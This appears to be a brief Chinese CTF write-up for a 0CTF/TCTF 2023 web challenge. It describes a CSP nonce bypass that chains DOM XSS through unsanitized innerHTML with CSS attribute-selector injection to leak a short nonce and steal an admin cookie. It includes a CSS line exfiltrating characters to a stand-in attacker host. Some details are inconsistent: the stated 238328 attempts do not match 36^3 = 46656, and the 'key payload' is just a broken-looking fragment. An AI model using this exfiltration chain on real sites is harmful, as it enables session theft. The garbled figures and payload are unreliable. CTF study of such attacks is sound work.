# 0CTF 2023 筆記 (CSP nonce bypass)

> 赛事：0CTF/TCTF 2023 2023 | 方向：web | 难度：insane

## 一句话总结

CSP nonce 爆破 + CSS 属性选择器 + webkit-cross-fade exfil

## 攻击链

1. URL hash 解析：location.hash.slice(1) 拿 id/username
2. DOM XSS：document.getElementById('content').innerHTML = data.content（无 sanitize）
3. CSP 限制: script-src ''nonce-<nonce>''; frame-src ''none''; object-src ''none''; base-uri ''self''; style-src ''unsafe-inline'' https://unpkg.com
4. Style-src unsafe-inline 允许内联 CSS → CSS 注入
5. CSS 攻击：script[nonce*=X]{--X: url(https://attacker/leak?q=X)}
6. webkit-cross-fade 触发 238328 次 36^3 子域爆破恢复 nonce
7. nonce 长度 3 字符（a-z0-9）共 36^3 = 46656 种可能，分 3 批爆破
8. 拿到 nonce 后注入 <script nonce> 拿 admin cookie / flag
9. puppeteer admin bot 触发 → 30s 内完成

## 关键 payload

```
aaa\
```

## 经验教训

CSP nonce 太短可爆破；style-src unsafe-inline 配合 CSS 属性选择器可偷 nonce；web 攻击面极广
